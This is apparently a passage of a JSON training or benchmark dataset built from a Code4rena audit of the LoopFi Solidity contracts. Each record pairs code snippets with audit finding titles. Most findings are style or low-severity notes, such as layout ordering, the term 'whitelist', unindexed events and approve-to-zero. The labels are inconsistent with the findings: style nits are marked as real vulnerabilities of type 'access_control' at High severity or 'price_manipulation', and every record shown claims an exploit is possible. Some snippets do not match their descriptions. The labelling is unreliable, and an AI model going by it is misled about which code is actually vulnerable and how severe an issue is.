(doTransfer) {\n                      IERC20(stakingToken).safeTransfer(address_, amount);\n                      incentivesController.afterLockUpdate(address_);\n                      emit Withdrawn(address_, amount, _balances[address_].locked, 0, 0, stakingToken != address(rdntToken));\n                  } else {\n                      revert InvalidAction();\n                  }\n              }\n              return amount;\n\n1385:     /**\n           * @notice Returns withdrawable balance at exact unlock time\n           * @param user address for withdraw\n           * @param unlockTime exact unlock time\n           * @return amount total withdrawable amount\n           * @return penaltyAmount penalty amount\n           * @return burnAmount amount to burn\n           * @return index of earning\n           */\n          function _ieeWithdrawableBalance(\n              address user,\n              uint256 unlockTime\n          ) internal view returns (uint256 amount, uint256 penaltyAmount, uint256 burnAmount, uint256 index) {\n              uint256 length = _userEarnings[user].length;\n              for (index; index < length; ) {\n                  if (_userEarnings[user][index].unlockTime == unlockTime) {\n                      (amount, , penaltyAmount, burnAmount) = _penaltyInfo(_userEarnings[user][index]);\n                      return (amount, penaltyAmount, burnAmount, index);\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Medium",
    "title": "<a name=\"NC-33\"></a>[NC-33] Adding a `return` statement when the function defines a named return variable, is redundant",
    "description": "*Instances (28)*: File: src/CDPVault.sol 462:     function _calcQuotaRevenueChange(int256 deltaDebt) internal view returns (int256 quotaRevenueChange) { uint16 rate = IPoolQuotaKeeperV3(poolQuotaKeeper()).getQuotaRate(address(token)); return QuotasLogic.calcQuotaRevenueChange(rate, deltaDebt);",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-07-loopfi",
    "audit_source": "code4rena",
    "lines_of_code": 218,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 1.0,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: src/reward/MultiFeeDistribution.sol\n\n232:         if (rdntToken_ == address(0)) revert AddressZero();\n\n233:         if (lockZap_ == address(0)) revert AddressZero();\n\n234:         if (dao_ == address(0)) revert AddressZero();\n\n235:         if (priceProvider_ == address(0)) revert AddressZero();\n\n236:         if (rewardsDuration_ == uint256(0)) revert AmountZero();\n\n237:         if (rewardsLookback_ == uint256(0)) revert AmountZero();\n\n238:         if (lockDuration_ == uint256(0)) revert AmountZero();\n\n239:         if (vestDuration_ == uint256(0)) revert AmountZero();\n\n240:         if (burnRatio_ > WHOLE) revert InvalidBurn();\n\n241:         if (rewardsLookback_ > rewardsDuration_) revert InvalidLookback();\n\n269:             if (minters_[i] == address(0)) revert AddressZero();\n\n283:         if (bounty == address(0)) revert AddressZero();\n\n294:         if (rewardConverter_ == address(0)) revert AddressZero();\n\n305:         if (lockPeriod_.length != rewardMultipliers_.length) revert InvalidLockPeriod();\n\n325:         if (address(controller_) == address(0)) revert AddressZero();\n\n326:         if (address(treasury_) == address(0)) revert AddressZero();\n\n337:         if (stakingToken_ == address(0)) revert AddressZero();\n\n338:         if (stakingToken != address(0)) revert AlreadySet();\n\n348:         if (_rewardToken == address(0)) revert AddressZero();\n\n349:         if (!minters[msg.sender]) revert InsufficientPermission();\n\n350:         if (rewardData[_rewardToken].lastUpdateTime != 0) revert AlreadyAdded();\n\n366:         if (!minters[msg.sender]) revert InsufficientPermission();\n\n380:         if (!isTokenFound) revert InvalidAddress();\n\n405:         if (index >= _lockPeriod.length) revert InvalidType();\n\n417:             revert InvalidAmount();\n\n428:             revert InvalidAmount();\n\n453:         if (lookback == uint256(0)) revert AmountZero();\n\n454:         if (lookback > rewardsDuration) revert InvalidLookback();\n\n468:         if (_operationExpenseRatio > RATIO_DIVISOR) revert InvalidRatio();\n\n469:         if (_operationExpenseReceiver == address(0)) revert AddressZero();\n\n497:         if (!minters[msg.sender]) revert InsufficientPermission();\n\n539:         if (amount == 0) revert AmountZero();\n\n549:             if (bal.earned < remaining) revert InvalidEarned();\n\n583:                     if (sumEarned == 0) revert InvalidEarned();\n\n620:         if (unlockTime <= block.timestamp) revert InvalidTime();\n\n690:         if (msg.sender != _lockZap) revert InsufficientPermission();\n\n726:         if (msg.sender != rewardConverter) revert InsufficientPermission();\n\n844:         if (msg.sender != address(bountyManager)) revert InsufficientPermission();\n\n1083:             if (amount < IBountyManager(bountyManager).minDLPBalance()) revert InvalidAmount();\n\n1085:         if (typeIndex >= _lockPeriod.length) revert InvalidType();\n\n1224:         if (token == address(0)) revert AddressZero();\n\n1230:         if (periodFinish == 0) revert InvalidPeriod();\n\n1282:         if (onBehalfOf != msg.sender) revert InsufficientPermission();\n\n1357:         if (isRelockAction && address_ != msg.sender && _lockZap != msg.sender) revert InsufficientPermission();\n\n1377:                 revert InvalidAction();\n\n1408:         revert UnlockTimeNotFound();\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "access_control",
    "severity": "High",
    "title": "<a name=\"NC-34\"></a>[NC-34] Take advantage of Custom Error's return value property",
    "description": "An important feature of Custom Error is that values such as address, tokenID, msg.value can be written inside the () sign, this kind of approach provides a serious advantage in debugging and examining the revert details of dapps such as tenderly. *Instances (190)*: File: src/CDPVault.sol 200:         else revert CDPVault__setParameter_unrecognizedParameter(); 210:         else revert CDPVault__setParameter_unrecognizedParameter();",
    "confidence": 0.9,
    "source": "code4rena",
    "repository": "2024-07-loopfi",
    "audit_source": "code4rena",
    "lines_of_code": 96,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 1.0,
    "vulnerability_types": [
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": true,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: src/reward/MultiFeeDistribution.sol\n\n39:     uint256 public constant WHOLE = 100000; // 100%\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Medium",
    "title": "<a name=\"NC-36\"></a>[NC-36] Use scientific notation for readability reasons for large multiples of ten",
    "description": "The more a number has zeros, the harder it becomes to see with the eyes if it's the intended value. To ease auditing and bug bounty hunting, consider using the scientific notation *Instances (1)*: File: src/reward/MultiFeeDistribution.sol 39:     uint256 public constant WHOLE = 100000; // 100% [Link to code](https://github.com/code-423n4/2024-07-loopfi/blob/main/src/reward/MultiFeeDistribution.sol)",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-07-loopfi",
    "audit_source": "code4rena",
    "lines_of_code": 6,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.109,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\nFile: src/reward/ChefIncentivesController.sol\n\n112:     error NotWhitelisted();\n\n209:     mapping(address => bool) public whitelist;\n\n211:     bool public whitelistActive;\n\n216:     modifier isWhitelisted() {\n\n217:         if (whitelistActive) {\n\n218:             if (!whitelist[msg.sender] && msg.sender != address(this)) revert NotWhitelisted();\n\n813:     function manualStopEmissionsFor(address _user, address[] memory _tokens) public isWhitelisted {\n\n844:     function manualStopAllEmissionsFor(address _user) external isWhitelisted {\n\n1006:         whitelist[user] = status;\n\n1012:     function toggleWhitelist() external onlyOwner {\n\n1013:         whitelistActive = !whitelistActive;\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "access_control",
    "severity": "Low",
    "title": "<a name=\"NC-37\"></a>[NC-37] Avoid the use of sensitive terms",
    "description": "Use [alternative variants](https://www.zdnet.com/article/mysql-drops-master-slave-and-blacklist-whitelist-terminology/), e.g. allowlist/denylist instead of whitelist/blacklist *Instances (11)*: File: src/reward/ChefIncentivesController.sol 112:     error NotWhitelisted(); 209:     mapping(address => bool) public whitelist;",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-07-loopfi",
    "audit_source": "code4rena",
    "lines_of_code": 26,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.7,
    "vulnerability_types": [
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: src/reward/MultiFeeDistribution.sol\n\n1: \n   Current order:\n   UsingForDirective.IERC20\n   UsingForDirective.IMintableToken\n   VariableDeclaration._priceProvider\n   VariableDeclaration.QUART\n   VariableDeclaration.HALF\n   VariableDeclaration.WHOLE\n   VariableDeclaration.MAX_SLIPPAGE\n   VariableDeclaration.PERCENT_DIVISOR\n   VariableDeclaration.AGGREGATION_EPOCH\n   VariableDeclaration.RATIO_DIVISOR\n   VariableDeclaration.burn\n   VariableDeclaration.rewardsDuration\n   VariableDeclaration.rewardsLookback\n   VariableDeclaration.DEFAULT_LOCK_INDEX\n   VariableDeclaration.defaultLockDuration\n   VariableDeclaration.vestDuration\n   VariableDeclaration.rewardConverter\n   VariableDeclaration.incentivesController\n   VariableDeclaration.rdntToken\n   VariableDeclaration.stakingToken\n   VariableDeclaration._lockZap\n   VariableDeclaration._balances\n   VariableDeclaration._userLocks\n   VariableDeclaration._userEarnings\n   VariableDeclaration.autocompoundEnabled\n   VariableDeclaration.lastAutocompound\n   VariableDeclaration.lockedSupply\n   VariableDeclaration.lockedSupplyWithMultiplier\n   VariableDeclaration._lockPeriod\n   VariableDeclaration._rewardMultipliers\n   VariableDeclaration.rewardTokens\n   VariableDeclaration.rewardData\n   VariableDeclaration.userRewardPerTokenPaid\n   VariableDeclaration.rewards\n   VariableDeclaration.daoTreasury\n   VariableDeclaration.starfleetTreasury\n   VariableDeclaration.minters\n   VariableDeclaration.autoRelockDisabled\n   VariableDeclaration.defaultLockIndex\n   VariableDeclaration.mintersAreSet\n   VariableDeclaration.lastClaimTime\n   VariableDeclaration.bountyManager\n   VariableDeclaration.userSlippage\n   VariableDeclaration.operationExpenseRatio\n   VariableDeclaration.operationExpenseReceiver\n   VariableDeclaration.isRewardToken\n   EventDefinition.Locked\n   EventDefinition.Withdrawn\n   EventDefinition.RewardPaid\n   EventDefinition.Relocked\n   EventDefinition.BountyManagerUpdated\n   EventDefinition.RewardConverterUpdated\n   EventDefinition.LockTypeInfoUpdated\n   EventDefinition.AddressesUpdated\n   EventDefinition.LPTokenUpdated\n   EventDefinition.RewardAdded\n   EventDefinition.LockerAdded\n   EventDefinition.LockerRemoved\n   EventDefinition.RevenueEarned\n   EventDefinition.OperationExpensesUpdated\n   EventDefinition.NewTransferAdded\n   ErrorDefinition.AddressZero\n   ErrorDefinition.AmountZero\n   ErrorDefinition.InvalidBurn\n   ErrorDefinition.InvalidRatio\n   ErrorDefinition.InvalidLookback\n   ErrorDefinition.MintersSet\n   ErrorDefinition.InvalidLockPeriod\n   ErrorDefinition.InsufficientPermission\n   ErrorDefinition.AlreadyAdded\n   ErrorDefinition.AlreadySet\n   ErrorDefinition.InvalidType\n   ErrorDefinition.ActiveReward\n   ErrorDefinition.InvalidAmount\n   ErrorDefinition.InvalidEarned\n   ErrorDefinition.InvalidTime\n   ErrorDefinition.InvalidPeriod\n   ErrorDefinition.UnlockTimeNotFound\n   ErrorDefinition.InvalidAddress\n   ErrorDefinition.InvalidAction\n   FunctionDefinition.constructor\n   FunctionDefinition.initialize\n   FunctionDefinition.setMinters\n   FunctionDefinition.setBountyManager\n   FunctionDefinition.addRewardConverter\n   FunctionDefinition.setLockTypeInfo\n   FunctionDefinition.setAddresses\n   FunctionDefinition.setLPToken\n   FunctionDefinition.addReward\n   FunctionDefinition.removeReward\n   FunctionDefinition.setDefaultRelockTypeIndex\n   FunctionDefinition.setAutocompound\n   FunctionDefinition.setUserSlippage\n   FunctionDefinition.toggleAutocompound\n   FunctionDefinition.setRelock\n   FunctionDefinition.setLookback\n   FunctionDefinition.setOperationExpenses\n   FunctionDefinition.stake\n   FunctionDefinition.vestTokens\n   FunctionDefinition.withdraw\n   FunctionDefinition.individualEarlyExit\n   FunctionDefinition.exit\n   FunctionDefinition.getAllRewards\n   FunctionDefinition.withdrawExpiredLocksForWithOptions\n   FunctionDefinition.zapVestingToLp\n   FunctionDefinition.claimFromConverter\n   FunctionDefinition.relock\n   FunctionDefinition.requalify\n   FunctionDefinition.recoverERC20\n   FunctionDefinition.getLockDurations\n   FunctionDefinition.getLockMultipliers\n   FunctionDefinition.lockInfo\n   FunctionDefinition.totalBalance\n   FunctionDefinition.getPriceProvider\n   FunctionDefinition.getRewardForDuration\n   FunctionDefinition.getBalances\n   FunctionDefinition.claimBounty\n   FunctionDefinition.getReward\n   FunctionDefinition.pause\n   FunctionDefinition.unpause\n   FunctionDefinition.requalifyFor\n   FunctionDefinition.lockedBalances\n   FunctionDefinition.lockedBalance\n   FunctionDefinition.earnedBalances\n   FunctionDefinition.withdrawableBalance\n   FunctionDefinition.lastTimeRewardApplicable\n   FunctionDefinition.rewardPerToken\n   FunctionDefinition.claimableRewards\n   FunctionDefinition._stake\n   FunctionDefinition._updateReward\n   FunctionDefinition._notifyReward\n   FunctionDefinition._notifyUnseenReward\n   FunctionDefinition._getReward\n   FunctionDefinition._withdrawTokens\n   FunctionDefinition._cleanWithdrawableLocks\n   FunctionDefinition._withdrawExpiredLocksFor\n   FunctionDefinition._ieeWithdrawableBalance\n   FunctionDefinition._insertLock\n   FunctionDefinition._earned\n   FunctionDefinition._penaltyInfo\n   FunctionDefinition._binarySearch\n   \n   Suggested order:\n   UsingForDirective.IERC20\n   UsingForDirective.IMintableToken\n   VariableDeclaration._priceProvider\n   VariableDeclaration.QUART\n   VariableDeclaration.HALF\n   VariableDeclaration.WHOLE\n   VariableDeclaration.MAX_SLIPPAGE\n   VariableDeclaration.PERCENT_DIVISOR\n   VariableDeclaration.AGGREGATION_EPOCH\n   VariableDeclaration.RATIO_DIVISOR\n   VariableDeclaration.burn\n   VariableDeclaration.rewardsDuration\n   VariableDeclaration.rewardsLookback\n   VariableDeclaration.DEFAULT_LOCK_INDEX\n   VariableDeclaration.defaultLockDuration\n   VariableDeclaration.vestDuration\n   VariableDeclaration.rewardConverter\n   VariableDeclaration.incentivesController\n   VariableDeclaration.rdntToken\n   VariableDeclaration.stakingToken\n   VariableDeclaration._lockZap\n   VariableDeclaration._balances\n   VariableDeclaration._userLocks\n   VariableDeclaration._userEarnings\n   VariableDeclaration.autocompoundEnabled\n   VariableDeclaration.lastAutocompound\n   VariableDeclaration.lockedSupply\n   VariableDeclaration.lockedSupplyWithMultiplier\n   VariableDeclaration._lockPeriod\n   VariableDeclaration._rewardMultipliers\n   VariableDeclaration.rewardTokens\n   VariableDeclaration.rewardData\n   VariableDeclaration.userRewardPerTokenPaid\n   VariableDeclaration.rewards\n   VariableDeclaration.daoTreasury\n   VariableDeclaration.starfleetTreasury\n   VariableDeclaration.minters\n   VariableDeclaration.autoRelockDisabled\n   VariableDeclaration.defaultLockIndex\n   VariableDeclaration.mintersAreSet\n   VariableDeclaration.lastClaimTime\n   VariableDeclaration.bountyManager\n   VariableDeclaration.userSlippage\n   VariableDeclaration.operationExpenseRatio\n   VariableDeclaration.operationExpenseReceiver\n   VariableDeclaration.isRewardToken\n   ErrorDefinition.AddressZero\n   ErrorDefinition.AmountZero\n   ErrorDefinition.InvalidBurn\n   ErrorDefinition.InvalidRatio\n   ErrorDefinition.InvalidLookback\n   ErrorDefinition.MintersSet\n   ErrorDefinition.InvalidLockPeriod\n   ErrorDefinition.InsufficientPermission\n   ErrorDefinition.AlreadyAdded\n   ErrorDefinition.AlreadySet\n   ErrorDefinition.InvalidType\n   ErrorDefinition.ActiveReward\n   ErrorDefinition.InvalidAmount\n   ErrorDefinition.InvalidEarned\n   ErrorDefinition.InvalidTime\n   ErrorDefinition.InvalidPeriod\n   ErrorDefinition.UnlockTimeNotFound\n   ErrorDefinition.InvalidAddress\n   ErrorDefinition.InvalidAction\n   EventDefinition.Locked\n   EventDefinition.Withdrawn\n   EventDefinition.RewardPaid\n   EventDefinition.Relocked\n   EventDefinition.BountyManagerUpdated\n   EventDefinition.RewardConverterUpdated\n   EventDefinition.LockTypeInfoUpdated\n   EventDefinition.AddressesUpdated\n   EventDefinition.LPTokenUpdated\n   EventDefinition.RewardAdded\n   EventDefinition.LockerAdded\n   EventDefinition.LockerRemoved\n   EventDefinition.RevenueEarned\n   EventDefinition.OperationExpensesUpdated\n   EventDefinition.NewTransferAdded\n   FunctionDefinition.constructor\n   FunctionDefinition.initialize\n   FunctionDefinition.setMinters\n   FunctionDefinition.setBountyManager\n   FunctionDefinition.addRewardConverter\n   FunctionDefinition.setLockTypeInfo\n   FunctionDefinition.setAddresses\n   FunctionDefinition.setLPToken\n   FunctionDefinition.addReward\n   FunctionDefinition.removeReward\n   FunctionDefinition.setDefaultRelockTypeIndex\n   FunctionDefinition.setAutocompound\n   FunctionDefinition.setUserSlippage\n   FunctionDefinition.toggleAutocompound\n   FunctionDefinition.setRelock\n   FunctionDefinition.setLookback\n   FunctionDefinition.setOperationExpenses\n   FunctionDefinition.stake\n   FunctionDefinition.vestTokens\n   FunctionDefinition.withdraw\n   FunctionDefinition.individualEarlyExit\n   FunctionDefinition.exit\n   FunctionDefinition.getAllRewards\n   FunctionDefinition.withdrawExpiredLocksForWithOptions\n   FunctionDefinition.zapVestingToLp\n   FunctionDefinition.claimFromConverter\n   FunctionDefinition.relock\n   FunctionDefinition.requalify\n   FunctionDefinition.recoverERC20\n   FunctionDefinition.getLockDurations\n   FunctionDefinition.getLockMultipliers\n   FunctionDefinition.lockInfo\n   FunctionDefinition.totalBalance\n   FunctionDefinition.getPriceProvider\n   FunctionDefinition.getRewardForDuration\n   FunctionDefinition.getBalances\n   FunctionDefinition.claimBounty\n   FunctionDefinition.getReward\n   FunctionDefinition.pause\n   FunctionDefinition.unpause\n   FunctionDefinition.requalifyFor\n   FunctionDefinition.lockedBalances\n   FunctionDefinition.lockedBalance\n   FunctionDefinition.earnedBalances\n   FunctionDefinition.withdrawableBalance\n   FunctionDefinition.lastTimeRewardApplicable\n   FunctionDefinition.rewardPerToken\n   FunctionDefinition.claimableRewards\n   FunctionDefinition._stake\n   FunctionDefinition._updateReward\n   FunctionDefinition._notifyReward\n   FunctionDefinition._notifyUnseenReward\n   FunctionDefinition._getReward\n   FunctionDefinition._withdrawTokens\n   FunctionDefinition._cleanWithdrawableLocks\n   FunctionDefinition._withdrawExpiredLocksFor\n   FunctionDefinition._ieeWithdrawableBalance\n   FunctionDefinition._insertLock\n   FunctionDefinition._earned\n   FunctionDefinition._penaltyInfo\n   FunctionDefinition._binarySearch\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "access_control",
    "severity": "High",
    "title": "<a name=\"NC-38\"></a>[NC-38] Contract does not follow the Solidity style guide's suggested layout ordering",
    "description": "The [style guide](https://docs.soliditylang.org/en/v0.8.16/style-guide.html#order-of-layout) says that, within a contract, the ordering should be: 1) Type declarations 2) State variables 3) Events 4) Modifiers",
    "confidence": 0.9,
    "source": "code4rena",
    "repository": "2024-07-loopfi",
    "audit_source": "code4rena",
    "lines_of_code": 291,
    "has_external_calls": true,
    "has_state_changes": false,
    "complexity_score": 1.0,
    "vulnerability_types": [
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": true,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: src/utils/Math.sol\n\n17: function toInt256(uint256 x) pure returns (int256) {\n\n23: function toUint64(uint256 x) pure returns (uint64) {\n\n29: function abs(int256 x) pure returns (uint256 z) {\n\n37: function min(uint256 x, uint256 y) pure returns (uint256 z) {\n\n44: function min(int256 x, int256 y) pure returns (int256 z) {\n\n51: function max(uint256 x, uint256 y) pure returns (uint256 z) {\n\n58: function add(uint256 x, int256 y) pure returns (uint256 z) {\n\n66: function sub(uint256 x, int256 y) pure returns (uint256 z) {\n\n74: function mul(uint256 x, int256 y) pure returns (int256 z) {\n\n83: function wmul(uint256 x, uint256 y) pure returns (uint256 z) {\n\n97: function wmul(uint256 x, int256 y) pure returns (int256 z) {\n\n105: function wmulUp(uint256 x, uint256 y) pure returns (uint256 z) {\n\n121: function wdiv(uint256 x, uint256 y) pure returns (uint256 z) {\n\n137: function wdivUp(uint256 x, uint256 y) pure returns (uint256 z) {\n\n152: function wpow(uint256 x, uint256 n, uint256 b) pure returns (uint256 z) {\n\n208: function wpow(int256 x, int256 y) pure returns (int256) {\n\n215: function wexp(int256 x) pure returns (int256 r) {\n\n282: function wln(int256 x) pure returns (int256 r) {\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "timestamp_dependence",
    "severity": "Low",
    "title": "<a name=\"NC-40\"></a>[NC-40] Internal and private variables and functions names should begin with an underscore",
    "description": "According to the Solidity Style Guide, Non-`external` variable and function names should begin with an [underscore](https://docs.soliditylang.org/en/latest/style-guide.html#underscore-prefix-for-non-external-functions-and-variables) *Instances (39)*: File: src/CDPVault.sol 652:     function calcDecrease( 717:     function calcAccruedInterest(",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-07-loopfi",
    "audit_source": "code4rena",
    "lines_of_code": 40,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 1.0,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\nFile: src/reward/MultiFeeDistribution.sol\n\n159:     event Locked(address indexed user, uint256 amount, uint256 lockedBalance, uint256 indexed lockLength, bool isLP);\n\n160:     event Withdrawn(\n\n168:     event RewardPaid(address indexed user, address indexed rewardToken, uint256 reward);\n\n169:     event Relocked(address indexed user, uint256 amount, uint256 lockIndex);\n\n172:     event LockTypeInfoUpdated(uint256[] lockPeriod, uint256[] rewardMultipliers);\n\n173:     event AddressesUpdated(IChefIncentivesController _controller, address indexed _treasury);\n\n178:     event RevenueEarned(address indexed asset, uint256 assetAmount);\n\n179:     event OperationExpensesUpdated(address indexed _operationExpenses, uint256 _operationExpenseRatio);\n\n180:     event NewTransferAdded(address indexed asset, uint256 lpUsdValue);\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "<a name=\"NC-41\"></a>[NC-41] Event is missing `indexed` fields",
    "description": "Index event fields make the field more quickly accessible to off-chain tools that parse events. However, note that each index field costs extra gas during emission, so it's not necessarily best to index the maximum allowed per event (three fields). Each event should use three indexed fields if there are three or more fields, and gas usage is not particularly of concern for the events in question. If there are fewer than three fields, all of the fields should be indexed. *Instances (27)*: File: src/CDPVault.sol 125:     event ModifyPosition(address indexed position, uint256 debt, uint256 collateral, uint256 totalDebt); 133:     event SetParameter(bytes32 indexed parameter, uint256 data);",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-07-loopfi",
    "audit_source": "code4rena",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": false,
    "complexity_score": 0.831,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: src/reward/MultiFeeDistribution.sol\n\n221:     function initialize(\n\n843:     function claimBounty(address user, bool execute) public whenNotPaused returns (bool issueBaseBounty) {\n\n873:     function pause() public onlyOwner {\n\n880:     function unpause() public onlyOwner {\n\n940:     function lockedBalance(address user) public view returns (uint256 locked) {\n\n961:     function earnedBalances(\n\n1049:     function claimableRewards(address account) public view returns (IFeeDistribution.RewardData[] memory rewardsData) {\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "access_control",
    "severity": "Medium",
    "title": "<a name=\"NC-43\"></a>[NC-43] `public` functions not called by the contract should be declared `external` instead",
    "description": "*Instances (20)*: File: src/proxy/PoolAction.sol 195:     function exit(PoolActionParams memory poolActionParams) public returns (uint256 retAmount) { [Link to code](https://github.com/code-423n4/2024-07-loopfi/blob/main/src/proxy/PoolAction.sol) File: src/proxy/SwapAction.sol",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-07-loopfi",
    "audit_source": "code4rena",
    "lines_of_code": 18,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.538,
    "vulnerability_types": [
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: src/proxy/PoolAction.sol\n\n81:                 for (uint256 i = 0; i < assets.length; ) {\n\n116:         for (uint256 i = 0; i < assets.length; ) {\n\n168:             for (uint256 i = 0; i < len; ) {\n\n227:         for (uint256 i = 0; i <= outIndex; ) {\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "price_manipulation",
    "severity": "Low",
    "title": "<a name=\"NC-44\"></a>[NC-44] Variables need not be initialized to zero",
    "description": "The default value for variables is zero, so initializing them to zero is superfluous. *Instances (16)*: File: src/VaultRegistry.sol 67:         for (uint256 i = 0; i < vaultLen; ) { 82:         for (uint256 i = 0; i < vaultLen; ) {",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-07-loopfi",
    "audit_source": "code4rena",
    "lines_of_code": 12,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.266,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      1,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "Ownable2Step.transferOwnership",
    "vulnerability_label": 1,
    "vulnerability_type": "reentrancy",
    "severity": "Low",
    "title": "Low Issues",
    "description": "| |Issue|Instances| |-|:-|:-:| | [L-1](#L-1) | `approve()`/`safeApprove()` may revert if the current approval is not zero | 3 | | [L-2](#L-2) | Use a 2-step ownership transfer pattern | 3 | | [L-3](#L-3) | Some tokens may revert when zero value transfers are made | 36 |",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-07-loopfi",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": true,
    "has_state_changes": false,
    "complexity_score": 0.03,
    "vulnerability_types": [
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: src/vendor/AuraVault.sol\n\n204:         IERC20(asset()).safeApprove(rewardPool, assets);\n\n221:         IERC20(asset()).safeApprove(rewardPool, assets);\n\n293:         IERC20(asset()).safeApprove(rewardPool, amountIn);\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "<a name=\"L-1\"></a>[L-1] `approve()`/`safeApprove()` may revert if the current approval is not zero",
    "description": "- Some tokens (like the *very popular* USDT) do not work when changing the allowance from an existing non-zero allowance value (it will revert if the current approval is not zero to protect against front-running changes of approvals). These tokens must first be approved for zero and then the actual allowance can be approved. - Furthermore, OZ's implementation of safeApprove would throw an error if an approve is attempted from a non-zero value (`\"SafeERC20: approve from non-zero to non-zero allowance\"`) Set the allowance to zero immediately before each of the existing allowance calls *Instances (3)*: File: src/vendor/AuraVault.sol",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-07-loopfi",
    "audit_source": "code4rena",
    "lines_of_code": 10,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.232,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: src/reward/ChefIncentivesController.sol\n\n20: contract ChefIncentivesController is Initializable, PausableUpgradeable, OwnableUpgradeable, RecoverERC20 {\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "reentrancy",
    "severity": "Low",
    "title": "<a name=\"L-2\"></a>[L-2] Use a 2-step ownership transfer pattern",
    "description": "Recommend considering implementing a two step process where the owner or admin nominates an account and the nominated account needs to call an `acceptOwnership()` function for the transfer of ownership to fully succeed. This ensures the nominated EOA account is a valid and active account. Lack of two-step procedure for critical operations leaves them error-prone. Consider adding two step procedure on the critical functions. *Instances (3)*: File: src/StakingLPEth.sol 8: contract StakingLPEth is ERC4626, Ownable, ReentrancyGuard { [Link to code](https://github.com/code-423n4/2024-07-loopfi/blob/main/src/StakingLPEth.sol)",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-07-loopfi",
    "audit_source": "code4rena",
    "lines_of_code": 6,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.169,
    "vulnerability_types": [
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: src/CDPVault.sol\n\n410:             poolUnderlying.safeTransferFrom(creditor, address(pool), amount);\n\n439:             token.safeTransferFrom(collateralizer, address(this), amount);\n\n442:             token.safeTransfer(collateralizer, amount);\n\n539:         poolUnderlying.safeTransferFrom(msg.sender, address(pool), repayAmount - penalty);\n\n565:         token.safeTransfer(msg.sender, takeCollateral);\n\n568:         poolUnderlying.safeTransferFrom(msg.sender, address(pool), penalty);\n\n610:         poolUnderlying.safeTransferFrom(msg.sender, address(pool), repayAmount);\n\n626:         token.safeTransfer(msg.sender, takeCollateral);\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "<a name=\"L-3\"></a>[L-3] Some tokens may revert when zero value transfers are made",
